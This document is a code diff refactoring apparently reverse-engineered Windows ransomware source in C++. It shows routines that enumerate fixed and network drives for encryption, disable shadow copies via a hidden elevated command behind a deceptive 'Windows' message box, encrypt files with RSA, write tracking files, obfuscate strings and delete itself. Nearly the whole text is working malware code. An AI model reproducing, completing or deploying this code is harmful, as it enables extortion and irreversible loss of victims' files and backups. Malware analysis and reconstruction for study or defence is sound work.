+    if (!is_shadow_copy_off) {
+      backups = work_stat_tick + backups;
     }
-    std::vector<std::string> localVector;
-    int foundVectorPos = 99999;
-    auto eniHandle = CreateFile(enigma_dot_rsa.c_str(), GENERIC_READ, 0, 0, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
-    if (eniHandle != INVALID_HANDLE_VALUE) {
+    std::vector<std::string> temp_vec;
+    auto found_pos = 99999;
+    auto enigma_handle = CreateFileW(enigma_dot_rsa.c_str(), GENERIC_READ, 0, 0, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
+    if (enigma_handle != INVALID_HANDLE_VALUE) {
       DWORD tmp;
-      auto fileSize = GetFileSize(eniHandle, &tmp);
-      auto buff = new char[fileSize];
+      auto file_size = GetFileSize(enigma_handle, &tmp);
+      auto buff = new char[file_size];
       tmp = 0;
-      ReadFile(eniHandle, buff, fileSize, &tmp, 0);
-      std::string fileData{ buff };//file contents
-      auto splitVec = std::move(splitStringToVec(fileData, "\n"));//split enigma file into sections
-      if (splitVec.size() - 1 > 0) {
-        for (unsigned i = 0; i < splitVec.size() - 1; i++) {
-          if (splitVec[i].find(hashStr.c_str(), 0, 15) != std::string::npos)
-            foundVectorPos = i;
-          localVector.push_back(splitVec[i]);
+      ReadFile(enigma_handle, buff, file_size, &tmp, 0);
+      std::string file_content{ buff };//file contents
+      auto string_vector = std::move(SplitString(file_content, "\n"));//split enigma file into sections
+      for (auto& current_str : string_vector) {
+        if (current_str.find(marker_str.c_str(), 0, 15) != std::string::npos) {
+          found_pos = i;
         }
+        temp_vec.push_back(current_str);
       }
-      CloseHandle(eniHandle);
+      CloseHandle(enigma_handle);
     }
     std::cout << "975b76915c4f08a07a8ceaafbf9c5d6b" << std::endl;
-    auto encStr = RsaEncrypt(workStatTick.c_str(), workStatTick.length());
-    std::string base{ hashStr };
-    base += encStr;
-    base.append(doubleSemicol);
+    auto encrypted_str = RsaEncrypt(work_stat_tick.c_str(), work_stat_tick.length());
+    std::string base{ marker_str };
+    base += encrypted_str;
+    base.append(double_semicol);
     base.append(mark_737);
     base.append("\n");
     std::cout << "32b08af8f36bd540f6ce2aefef49c41a" << std::endl;
     //data remux
-    if (foundVectorPos == 99999) {
-      auto eniHandle = CreateFile(enigma_dot_rsa.c_str(), GENERIC_WRITE, 0, 0, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
-      if (eniHandle != INVALID_HANDLE_VALUE) {
+    if (found_pos == 99999) { //first run
+      auto en_handle = CreateFileW(enigma_dot_rsa.c_str(), GENERIC_WRITE, 0, 0, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
+      if (en_handle != INVALID_HANDLE_VALUE) {
         DWORD tmp;
-        auto fileSize = GetFileSize(eniHandle, &tmp);
-        SetFilePointer(eniHandle, fileSize, 0, FILE_BEGIN);//append to file
-        std::string baseEndl = base + '\n';
+        auto file_size = GetFileSize(en_handle, &tmp);
+        SetFilePointer(en_handle, file_size, 0, FILE_BEGIN);//append to file
+        base += '\n';
         DWORD bytesWritten;
-        WriteFile(eniHandle, baseEndl.data(), baseEndl.length(), &bytesWritten, false);
-        CloseHandle(eniHandle);
+        WriteFile(en_handle, base.data(), base.length(), &bytesWritten, false);
+        CloseHandle(en_handle);
       }
-    } else {
-      auto eniHandle = CreateFile(enigma_dot_rsa.c_str(), GENERIC_WRITE, 0, 0, TRUNCATE_EXISTING, FILE_ATTRIBUTE_NORMAL, 0);
-      if (eniHandle != INVALID_HANDLE_VALUE) {
-        localVector[foundVectorPos] = base;
-        for (auto& str : localVector) {
+    } else { //previous results found, overwrite
+      auto en_handle = CreateFileW(enigma_dot_rsa.c_str(), GENERIC_WRITE, 0, 0, TRUNCATE_EXISTING, FILE_ATTRIBUTE_NORMAL, 0);
+      if (en_handle != INVALID_HANDLE_VALUE) {
+        temp_vec[found_pos] = base; //replace stats with new data
+        for (auto& str : temp_vec) { //write everything back
           auto buff = str + '\n';
           DWORD bytesWritten;
-          WriteFile(eniHandle, buff.data(), buff.length(), &bytesWritten, false);
+          WriteFile(en_handle, buff.data(), buff.length(), &bytesWritten, false);
         }
-        CloseHandle(eniHandle);
+        CloseHandle(en_handle);
       }
     }
     std::cout << "1ed30e5d21edac51176d993dc06ec27e" << std::endl;
     Sleep(1000);
     std::cout << "20a8948ffaa6348f6caa8eb2aa15e42a" << std::endl;
-  }//outter loop
+  } //while(!no_more_files)
   ExitThread(0);
 }
-
-void getDrives() {
-  std::vector<std::string> localVector;
-  localVector.push_back(InnerDecrypt("vv*(*,*(*-++*("));//Unknown
-  localVector.push_back(InnerDecrypt("YN*(+**t*$*N*YCx+x*t+Y*K"));//Invalid path
-  localVector.push_back(InnerDecrypt("vC*v*;*-+**t*C*$*v"));//Removable
-  localVector.push_back(InnerDecrypt("Y**N+K*v*Y"));//Fixed
-  localVector.push_back(InnerDecrypt("Y(*v+Y++*-+C*,Cx*Y+C*N+**v"));//Network drive
-  localVector.push_back(InnerDecrypt("Y%YYC;vCY-Y;")); //CD-ROM
-  localVector.push_back(InnerDecrypt("vCYtY;Cx*Y*N+%*,")); //RAM disk
-  std::string driveSeparator{ InnerDecrypt("%mv$v$") };// :\\ /
-  std::string ramDisk{ InnerDecrypt("vCYtY;Cx*Y*N+%*,") };
+//========================================================================
+//   create list of all interesting directories to encrypt
+//========================================================================
+void FillDirectoryQueue() {
+  std::vector<std::string> types_vector;
+  types_vector.push_back(InnerDecrypt("vv*(*,*(*-++*("));//Unknown
+  types_vector.push_back(InnerDecrypt("YN*(+**t*$*N*YCx+x*t+Y*K"));//Invalid path
+  types_vector.push_back(InnerDecrypt("vC*v*;*-+**t*C*$*v"));//Removable
+  types_vector.push_back(InnerDecrypt("Y**N+K*v*Y"));//Fixed
+  types_vector.push_back(InnerDecrypt("Y(*v+Y++*-+C*,Cx*Y+C*N+**v"));//Network drive
+  types_vector.push_back(InnerDecrypt("Y%YYC;vCY-Y;")); //CD-ROM
+  types_vector.push_back(InnerDecrypt("vCYtY;Cx*Y*N+%*,")); //RAM disk
+  std::string drive_sep{ InnerDecrypt("%mv$v$") };// :\\ /
+  std::string ramdisk{ InnerDecrypt("vCYtY;Cx*Y*N+%*,") };
   std::string fixed{ InnerDecrypt("Y**N+K*v*Y") };
   std::string removable{ InnerDecrypt("vC*v*;*-+**t*C*$*v") };
-  std::string netDrive{ InnerDecrypt("Y(*v+Y++*-+C*,Cx*Y+C*N+**v") };
+  std::string net_drive{ InnerDecrypt("Y(*v+Y++*-+C*,Cx*Y+C*N+**v") };
   char drives[1024];
   GetLogicalDriveStrings(1024, drives);
   if (drives[0] == '\0')
     return;
-  auto drivePtr = drives;
+  auto cur_drive_ptr = drives;
   int i = 0;
-  while (*drivePtr) {
-    std::string curDrive{ drivePtr };
-    curDrive += ":"; //get drive letter - тут какое-то перемещение по указателю, пока не заморачивался
-    if (localVector[GetDriveType(&drives[i])] == fixed
-      || localVector[GetDriveType(&drives[i])] == netDrive) {
+  while (*cur_drive_ptr) {
+    std::string cur_drive{ cur_drive_ptr };
+    cur_drive += ":"; //get drive letter
+    if (types_vector[GetDriveType(&drives[i])] == fixed
+      || types_vector[GetDriveType(&drives[i])] == net_drive) {
       std::cout << "5c1511181fb2fc13331a8f75030484cc" << std::endl;
-      directories_queue.push(curDrive);
+      directories_queue.push(cur_drive);
     }
-    drivePtr += strlen(drivePtr) + 1;//move to next drive letter
+    cur_drive_ptr += strlen(cur_drive_ptr) + 1;//move to next drive letter
   }
 }
-DWORD WINAPI turnShadowCopyOff(LPVOID lpParameter) {
+//========================================================================
+//  turn windows shadow copy off, to make file restoration more difficult
+//========================================================================
+DWORD WINAPI TurnShadowCopyOff(LPVOID lpParameter) {
   Sleep(10000);
   auto uhnd = LoadLibrary(user32.c_str());
-  FARPROC mBoxFunc, execFunc;
-  if (uhnd)
-    mBoxFunc = GetProcAddress(uhnd, InnerDecrypt("Y; *v + %+%*t*+*vYC*-+KYt").data());
+  FARPROC message_box_func, exec_func;
+  if (uhnd) {
+    message_box_func = GetProcAddress(uhnd, InnerDecrypt("Y; *v + %+%*t*+*vYC*-+KYt").data()); //MessageBoxA
+  }
   auto shnd = LoadLibrary(shell32.c_str());
-  if (shnd)
-    execFunc = GetProcAddress(shnd, InnerDecrypt(shell_exec.data()).c_str());
+  if (shnd) {
+    exec_func = GetProcAddress(shnd, InnerDecrypt(shell_exec.data()).c_str());
+  }
   int counter = 0;
   while (counter < 1000) {
     auto command = "/C \"" + vssAdmCommand + "\"";
-    if (mBoxFunc)
-      ((int (WINAPI*) (HWND, LPCTSTR, LPCSTR, UINT))mBoxFunc)(NULL, decoyMessage1.data(), "Windows", MB_OK);
+    if (message_box_func) {
+      ((int (WINAPI*) (HWND, LPCTSTR, LPCSTR, UINT))message_box_func)(NULL, decoy_message.data(), "Windows", MB_OK);
+    }
     std::string runas{ InnerDecrypt("+C+v*(*t+%") }; //runas in unicode
     std::string cmd{ InnerDecrypt("*%*;*Y") }; //cmd
-    std::string winDir{ InnerDecrypt("*%%mv$v$++*N*(*Y*-+++%v$v$") }; //c:\\windows\/\/
+    std::string win_dir{ InnerDecrypt("*%%mv$v$++*N*(*Y*-+++%v$v$") }; //c:\\windows\/\/
     SHELLEXECUTEINFO si;
     memset(&si.fMask, 0, 0x38);
     si.cbSize = sizeof(si);
@@ -1085,25 +1142,30 @@ DWORD WINAPI turnShadowCopyOff(LPVOID lpParameter) {
     si.lpVerb = runas.c_str();
     si.lpFile = cmd.c_str();
     si.lpParameters = command.c_str();
-    si.lpDirectory = winDir.c_str();
+    si.lpDirectory = win_dir.c_str();
     si.nShow = SW_HIDE;
     si.hInstApp = NULL;
-    if (execFunc)
-      if (((BOOL(*) (SHELLEXECUTEINFO*))execFunc)(&si)) {
-        if (uhnd)
+    if (exec_func) {
+      if (((BOOL(*) (SHELLEXECUTEINFO*))exec_func)(&si)) { //success
+        if (uhnd) {
           FreeLibrary(uhnd);
+        }
         std::cout << "fcc2242b5b0bbeec2ef58f19a676e619" << std::endl;
-        if (shnd)
+        if (shnd) {
           FreeLibrary(shnd);
-        shadowCopyOff = true; // shadow copying turned off
-        ExitThread(0);
+        }
+        is_shadow_copy_off = true; // shadow copying turned off
+        ExitThread(0); 
       }
+    }
     Sleep(10000);
     counter++;
   }
   return true;
 }
-
+//========================================================================
+//  encrypt from one file to another
+//========================================================================
 void EncryptFileStats(const std::wstring& encrypt_to, const std::wstring& read_from) {
   HCRYPTPROV h_prov;
   HCRYPTKEY h_key;
@@ -1112,25 +1174,26 @@ void EncryptFileStats(const std::wstring& encrypt_to, const std::wstring& read_f
   CryptImportKey(h_prov, kRsaPublicKey, sizeof(kRsaPublicKey), NULL, 0, &h_key);
   CryptCreateHash(h_prov, CALG_SHA, h_key, 0, &h_hash);
   CryptHashData(h_hash, kRsaPublicKey, sizeof(kRsaPublicKey), 0);
-  CryptDeriveKey(h_hash, CALG_DSS_SIGN, h_hash, 0, &h_key); //does not work - pathetic
+  CryptDeriveKey(h_hash, CALG_DSS_SIGN, h_hash, 0, &h_key); //does not work - wrong algo
   auto first_hnd = CreateFileW(encrypt_to.data(), GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
   auto second_hnd = CreateFileW(read_from.data(), GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_FLAG_WRITE_THROUGH, NULL);
   DWORD chunk_size = 0;
   if (CryptEncrypt(h_key, h_hash, true, 0, NULL, &chunk_size, 0)) {
     std::cout << "c2b98ea9211698a01f5fc50d6319f27f" << std::endl;
   }
-  auto dyn_buffer = malloc(65);
+  auto dyn_buffer = new char[65];
   DWORD bytes_read = 0;
-  bool read_complete = false;
-  while (!read_complete) {
+  bool final = false;
+  while (!final) {
     ReadFile(second_hnd, dyn_buffer, 40, &bytes_read, 0);
     if (bytes_read != 40) {
-      read_complete = true;
+      final = true;
     }
     std::string triple_0{ InnerDecrypt("v$%xv$%xv$%x") };
     memcpy((char*)dyn_buffer + bytes_read, triple_0.data(), triple_0.length());
     DWORD bytes_to_write = 40;
-    if (!CryptEncrypt(h_key, h_hash, read_complete, 0, (unsigned char*)dyn_buffer, &bytes_to_write, chunk_size)) {
+    if (!CryptEncrypt(h_key, h_hash, final, 0, (unsigned char*)dyn_buffer, &bytes_to_write, chunk_size)) {
+      GetLastError(); //because why not
       std::cout << "3d4df3f87b73e501d4d6dc3aed4505b3" << std::endl;
     }
     DWORD bytes_written = 0;
@@ -1151,7 +1214,7 @@ void EncryptFileStats(const std::wstring& encrypt_to, const std::wstring& read_f
     CryptReleaseContext(h_prov, 0);
   }
   //free(NULL); //original code - mem leak
-  free(dyn_buffer);
+  delete[] dyn_buffer;
   return;
 }
 
@@ -1159,15 +1222,15 @@ void WriteFilesStats() {
   std::string result_str{ ("v+Y-vCY,v%vYYtvYY;Y;Y;v$*(") }; //WORKSTATMMM\n
   result_str += formatted_mac_string;
   result_str += "\n";
-  for (auto i = 0; i < vector_filetype_count.size(); i++) {
-    std::string current_sum = std::to_string(vector_filetype_count[i]);
-    std::string current_ext = converter.to_bytes(all_extensions[i]);
+  for (auto i = 0; i < encoded_exts_stats.size(); i++) {
+    std::string current_sum = std::to_string(encoded_exts_stats[i]);
+    std::string current_ext = converter.to_bytes(exts_to_encrypt[i]);
     result_str += current_ext;
     result_str += "->";
     result_str += current_sum;
     result_str += "\n";
   }
-  temp_file = temp_path + converter.from_bytes(enigma_dot_rsa);
+  temp_file = temp_path_wstr + enigma_dot_rsa;
   auto file_hnd = CreateFileW(temp_file.data(), GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
   if (file_hnd == INVALID_HANDLE_VALUE) { //written values for the first time
     DWORD unused;
@@ -1180,8 +1243,8 @@ void WriteFilesStats() {
     WriteFile(file_hnd, encrypted_str.data(), encrypted_str.length(), &unused, NULL);
     CloseHandle(file_hnd);
   }
-  auto new_file = converter.from_bytes(enigma_dot_rsa);
-  auto desktop_file = desktop_dir + converter.from_bytes("\\") + converter.from_bytes(enigma_dot_rsa) + converter.from_bytes("2");
+  auto new_file = enigma_dot_rsa;
+  auto desktop_file = desktop_dir + converter.from_bytes("\\") + enigma_dot_rsa + converter.from_bytes("2");
   EncryptFileStats(desktop_file, temp_file.length() ? temp_file : desktop_file);
   auto dtop_hnd = CreateFileW(desktop_file.data(), GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
   if (dtop_hnd != INVALID_HANDLE_VALUE) {
@@ -1199,11 +1262,11 @@ void WriteFilesStats() {
   Sleep(500);
   DeleteFileW(temp_file.data());
   MoveFileW(desktop_file.data(), temp_file.data());
-  auto cur_file_path = desktop_dir + converter.from_bytes("\\") + converter.from_bytes(enigma_dot_rsa);
+  auto cur_file_path = desktop_dir + converter.from_bytes("\\") + enigma_dot_rsa;
   CopyFileW(temp_file.data(), new_file.data(), false);
-  auto html_file = temp_path + converter.from_bytes(html_file_name);
+  auto html_file = temp_path_wstr + html_file_name;
   CopyFileW(temp_file.data(), html_file.data(), false);
-  auto falcon_file = temp_path + converter.from_bytes(falconStr);
+  auto falcon_file = temp_path_wstr + falcon9_str;
   DeleteFileW(falcon_file.data());
   auto falcon_hnd = CreateFileW(falcon_file.data(), GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
   if (falcon_hnd != INVALID_HANDLE_VALUE) {
@@ -1216,7 +1279,7 @@ void WriteFilesStats() {
   std::cout << "5da7f788fbfb90e38e9bdd6fbd3809ee" << std::endl;
   char buff[56];
   memset(buff, 0, 56);
-  auto js_file = converter.to_bytes(temp_path) + js_file_name;
+  auto js_file = converter.to_bytes(temp_path_wstr) + js_file_name;
   SHELLEXECUTEINFO exec_info;
   memset(&exec_info, 0, sizeof(exec_info));
   exec_info.fMask = SEE_MASK_NOCLOSEPROCESS;
@@ -1297,7 +1360,7 @@ bool RecodeFile(const std::string& file_name) {
     move_dist.QuadPart += bytes_read;
   }
   DWORD bytes_written;
-  if (WriteFile(file_hnd, derived_key.data(), derived_key.length(), &bytes_written, 0)) {
+  if (WriteFile(file_hnd, encrypted_key.data(), encrypted_key.length(), &bytes_written, 0)) {
     ret_res = true;
   }
   std::cout << "f5fdab66c661da597346a30502b972d4" << std::endl;
@@ -1326,7 +1389,7 @@ end:
 DWORD WINAPI FileCodingThread(LPVOID lpParameter) {
   Sleep(2000);
   std::cout << "38c35991edec6854e8e5e76fd3b899c7" << std::endl;
-  std::string cur_file_name;
+  std::wstring cur_file_name;
   while (true) {
     int i = 0;
     while (i < 4) {
@@ -1349,7 +1412,7 @@ DWORD WINAPI FileCodingThread(LPVOID lpParameter) {
       //making standard windows path for file name
       std::string new_file_name = std::regex_replace(cur_file_name, std::regex{ rev_slash }, double_slash); //changed / to \\ 
       new_file_name = std::regex_replace(new_file_name, std::regex{ sem_2_slash }, sem_4_slash); //changed :\\ to :\\\\ 
-      if (enigma_dot_rsa_newlines) {
+      if (enigma_dot_rsa_num_lines) {
         auto encrypted_file_name = new_file_name + dot_enigma;
       }
       //original code
@@ -1365,8 +1428,8 @@ DWORD WINAPI FileCodingThread(LPVOID lpParameter) {
             //add to totals vector
             std::cout << "d1ed9cc5e1ba199ae255030a3988e155" << std::endl;
             std::string cur_file_ext = cur_file_name.substr(cur_file_name.find_last_of('.'), std::string::npos);
-            auto pos = std::find(all_extensions.begin(), all_extensions.end(), converter.from_bytes(cur_file_ext));
-            vector_filetype_count[pos - all_extensions.begin()]++;
+            auto pos = std::find(exts_to_encrypt.begin(), exts_to_encrypt.end(), converter.from_bytes(cur_file_ext));
+            encoded_exts_stats[pos - exts_to_encrypt.begin()]++;
             std::cout << "374c48183907470abccb957a73b7e3c9" << std::endl;
             total_encrypted_counter++;
           }
@@ -1425,18 +1488,21 @@ void DeleteSelf() {
 }
 
 
-bool TurhShadowCopyOff_2() {
+bool TurnShadowCopyOff_2() {
   auto lhnd = LoadLibrary(user32.data());
   FARPROC mBoxFunc = NULL, execFunc = NULL;
-  if (lhnd)
+  if (lhnd) {
     mBoxFunc = GetProcAddress(lhnd, InnerDecrypt("Y; *v + %+%*t*+*vYC*-+KYt").data()); //MessageBoxA
+  }
   auto shnd = LoadLibrary(shell32.data());
-  if (shnd)
+  if (shnd) {
     execFunc = GetProcAddress(shnd, shell_exec.data()); //ShellExec;
+  }
   auto command = "/C \"" + vssAdmCommand + "\"";
-  auto decoyMessage = InnerDecrypt("$-((-t-C((-x(((;(;----Cx(--x(((%-x(x($($(xCx(C(;(v-t(,(xCx(K(+($(v(;(v(;(K--Cx(CCx-Y(x(N(,(((C-%-(Cx-t(K-t-C(v($-%C(Cx$;(x(*($(K-C(vCx$Y$xCx(Y(,--Cx((-C($(v(;-,Cx(K(+($(v(;(v(;(K(NC(");// text in cp-1251: Посторонняя программа внесла изменения в файловую систему. Нажмите ДА для отмены изменений. 
-  if (mBoxFunc)
+  auto decoyMessage = InnerDecrypt("$-((-t-C((-x(((;(;----Cx(--x(((%-x(x($($(xCx(C(;(v-t(,(xCx(K(+($(v(;(v(;(K--Cx(CCx-Y(x(N(,(((C-%-(Cx-t(K-t-C(v($-%C(Cx$;(x(*($(K-C(vCx$Y$xCx(Y(,--Cx((-C($(v(;-,Cx(K(+($(v(;(v(;(K(NC(");// text in cp-1251: РџРѕСЃС‚РѕСЂРѕРЅРЅСЏСЏ РїСЂРѕРіСЂР°РјРјР° РІРЅРµСЃР»Р° РёР·РјРµРЅРµРЅРёСЏ РІ С„Р°Р№Р»РѕРІСѓСЋ СЃРёСЃС‚РµРјСѓ. РќР°Р¶РјРёС‚Рµ Р”Рђ РґР»СЏ РѕС‚РјРµРЅС‹ РёР·РјРµРЅРµРЅРёР№. 
+  if (mBoxFunc) {
     ((int (WINAPI*) (HWND, LPCTSTR, LPCSTR, UINT))mBoxFunc)(NULL, decoyMessage.data(), "Windows", MB_OK);  //how original
+  }
   std::string runas{ InnerDecrypt("+C+v*(*t+%") }; //runas in unicode
   std::string cmd{ InnerDecrypt("*%*;*Y") }; //cmd
   std::string winDir{ InnerDecrypt("*%%mv$v$++*N*(*Y*-+++%v$v$") }; //c:\\windows\/\/
@@ -1656,6 +1722,8 @@ DWORD __stdcall GetBinaryTypeThread(LPVOID lpThreadParameter) {
 }
 
 int main(int argc, char** argv) {
+  //std::string txt = "12345";
+  //RsaEncrypt(txt.data(), txt.length());
   char** args = argv;
   std::cout << "b2ea16364568d46e0a3926515b88c057" << std::endl;
   auto user_hnd = LoadLibrary(user32.c_str());
@@ -1685,9 +1753,7 @@ int main(int argc, char** argv) {
   strlen(*args); //and nothing happens
   std::cout << "2332e8a46ceb92a892b5f108cf3e9828" << std::endl;
   std::string fffdebfeedffd = InnerDecrypt("*******Y*v*C***v*v*Y*****Y"); //ffdebfeedffd - not used here
-  /*
-  CreateAutostartRegKey();
-  */
+  //CreateAutostartRegKey(); // create registry key for autorun, you probably dont want it on your machine
   std::cout << "3d8ce7b467eb2f65dbdb6a4fb7f43ce5" << std::endl;
   std::wstring vbp = converter.from_bytes(InnerDecrypt("+**v+C+NCx*C*t*YCx+x+C*-*++C*t*;*;*v+C"));  //very bad programmer
   auto ehnd = CreateEventW(NULL, false, false, vbp.data()); //stupid singleton check from books
@@ -1711,9 +1777,9 @@ int main(int argc, char** argv) {
   CreateThread(0, 0, CheckEncFilesStats, 0, 0, 0);
   std::cout << "52853a9d3f54f093c8b8ca60690b9481" << std::endl;
   std::cout << "034cf33b3aa544260f4cb7696ca5effe" << std::endl;
-  getDrives();
+  FillDirectoryQueue();
   std::cout << "24beeebd5bd8104687909c4495ff927c" << std::endl;
-  CreateThread(0, 0, turnShadowCopyOff, 0, 0, 0);
+  CreateThread(0, 0, TurnShadowCopyOff, 0, 0, 0);
   CreateThread(0, 0, FileCodingThread, 0, 0, 0);
   GetStdHandle(STD_OUTPUT_HANDLE); // WHYYYYYYYY??
   auto main_mtx = CreateMutex(NULL, false, NULL);
@@ -1731,7 +1797,7 @@ int main(int argc, char** argv) {
   std::cout << "fd2cb885c620ac81a83386a787db1265" << std::endl;
   WaitForMultipleObjects(5, threads, true, INFINITE);
   std::cout << "af4ffc475c5aa34c56cc8c116c722810" << std::endl;
-  auto workstatistic_file_name = temp_path + converter.from_bytes(work_statistic);
+  auto workstatistic_file_name = temp_path_wstr + converter.from_bytes(work_statistic);
   DeleteFileW(workstatistic_file_name.data());
   auto hnd = CreateFileW(workstatistic_file_name.data(), GENERIC_WRITE, NULL, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, false);
   if (hnd != INVALID_HANDLE_VALUE) {
@@ -1751,7 +1817,7 @@ int main(int argc, char** argv) {
   }
   std::cout << "b72e30e215687bdd60241a72f91ce81b" << std::endl;
   Sleep(7000);
-  TurhShadowCopyOff_2();
+  TurnShadowCopyOff_2();
   Sleep(25000);
   DeleteSelf();
 }
